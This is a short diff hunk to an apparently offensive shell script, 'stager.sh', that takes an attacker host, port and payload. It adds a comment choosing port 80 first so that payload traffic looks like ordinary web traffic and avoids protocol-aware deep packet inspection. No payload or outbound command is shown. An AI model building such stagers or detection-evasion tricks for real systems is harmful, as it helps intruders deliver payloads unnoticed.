@@ -17,6 +17,8 @@ VM_SH="${VM_SH:-/root/vm.sh}"
 LHOST="${1:?usage: stager.sh <lhost> [port] [payload-file-or-command]}"
 WANT_PORT="${2:-}"
 PAYLOAD="${3:-}"
+# 80 first: this serves genuine plaintext HTTP, so plaintext-on-80 reads as ordinary web
+# traffic, while plaintext-on-443 can look anomalous to protocol-aware DPI.
 PORTS="80 443 53 8000 8080"
 DEFAULT_RLPORT="443"
 
